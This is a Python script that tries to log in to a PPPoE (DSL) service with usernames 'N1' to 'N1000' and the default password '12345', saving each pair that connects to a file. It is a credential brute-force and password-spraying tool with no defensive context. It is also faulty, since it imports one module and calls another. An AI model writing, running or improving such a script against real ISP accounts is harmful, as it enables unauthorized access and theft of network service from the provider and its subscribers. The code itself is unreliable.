#!/usr/bin/python3

import pppoe

# Define prefix for usernames
username_prefix = "N"

# VPI and VCI configuration
vpi = 0
vci = 35

# File to save successful credentials
success_file = "successful_logins.txt"

# Open file in write mode to overwrite existing content or create new file
with open(success_file, "w") as f:
    for i in range(1, 1001):
        # Generate username with prefix and 1-3 digit number
        if i < 10:
            username = f"{username_prefix}{i}"
        elif i < 100:
            username = f"{username_prefix}{i:02d}"
        else:
            username = f"{username_prefix}{i:03d}"
        password = "12345"

        # Create a new PPPoE connection with the given credentials and configuration
        pppoe = pppoeconf.PPPoEConnection(username, password, vpi, vci)

        # Start the PPPoE connection
        pppoe.connect()

        # Check if the connection was successful
        if pppoe.is_connected():
            print(f"PPPoE connection established successfully with {username}")
            # Save successful login to file
            f.write(f"{username},{password}\n")
        else:
            print(f"Failed to establish PPPoE connection with {username}")
